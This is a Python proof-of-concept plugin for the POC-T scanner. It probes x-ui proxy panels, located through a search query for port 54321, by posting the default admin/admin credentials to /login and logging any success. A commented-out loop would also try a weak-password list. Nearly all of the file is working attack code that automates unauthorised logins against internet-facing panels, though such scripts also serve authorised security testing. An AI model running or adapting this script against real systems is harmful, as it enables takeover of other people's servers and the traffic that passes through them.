#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   ssr-xui_weak_pass.py.py
@DateTime :  2023/3/11 18:01
@Usage:
    python2 POC-T.py -s ssr-xui_weak_pass.py -aF "port=54321 && body='xui'"

'''

from lib.utils.http import request, get_schemed_url, urljoin_ex
from lib.core.data import paths, logger


def _get_post_data(pwd="admin"):
    pwd = pwd.strip()
    post_data = {
        "username": "admin",
        "password": pwd
    }
    return post_data


def _is_valid_login(resp):
    if not resp:
        return False

    if "false" in resp.text:
        return False

    else:
        return True


def login_by_url_and_pwd(login_url, pwd):
    post_data = _get_post_data(pwd)
    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
    if _is_valid_login(resp):
        msg = "%s, admin/%s, %s second" % (login_url, "admin", resp.elapsed.total_seconds())
        logger.info(msg)
        return True
    else:
        return False


def poc(url):
    url = get_schemed_url(url)
    login_url = urljoin_ex(url, "/login")

    # with open(paths.WEAK_PASS_10, "r") as f:
    #     pwd_list = f.readlines()
    # for pwd in pwd_list:
    valid = login_by_url_and_pwd(login_url, "admin")
    if valid:
        return True
    else:
    # fail when finished
       return False
